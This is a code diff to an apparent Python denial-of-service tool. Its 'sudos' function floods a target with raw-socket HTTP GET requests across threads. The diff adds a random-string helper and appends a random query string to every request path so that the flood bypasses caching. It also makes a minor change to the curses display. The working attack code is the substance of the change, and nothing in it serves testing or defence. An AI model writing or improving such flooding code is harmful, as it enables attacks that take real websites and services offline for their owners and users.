@@ -198,6 +198,13 @@ def urlsplit(url: str) -> (None, "URLObject"):
 
     return url_object
 
+def randstring(length: int) -> str:
+    chars = "qweqrtyuiopasdfghjklzxcvbnmQWWEWRTYUIOPASDFGHJKLZXCVBNM"
+    string = random.choices(list(chars), k=length)
+    string = "".join(string)
+
+    return string
+
 def sudos(url: str, **kwargs) -> None:
     try:
         settings.active_threads += 1
@@ -287,7 +294,10 @@ def sudos(url: str, **kwargs) -> None:
                     header_value = headers[header]
                     headers_string += f"{header_name}: {header_value}\r\n"
                 headers_string = headers_string.strip()
-                http = f"GET {url.path} HTTP/1.1\r\nHost: {url.domain}\r\n{headers_string}\r\n\r\n"
+                path = f"{url.path}?{randstring(77)}"
+                if url.parameters:
+                    path += f"&{url.parameters}"
+                http = f"GET {path} HTTP/1.1\r\nHost: {url.domain}\r\n{headers_string}\r\n\r\n"
                 sock.send(http.encode())
                 time.sleep(delay)
         elif method == 2:
@@ -411,7 +421,7 @@ def c_main(scr):
 
     scr.clear()
 
-    separator = 20
+    separator = 13
 
     while True:
         sx, sy = scr.getmaxyx()
@@ -452,7 +462,6 @@ def main():
                 sys.exit()
             elif settings.status == 2:
                 break
-
         curses.wrapper(c_main)
     except KeyboardInterrupt:
         sys.exit()
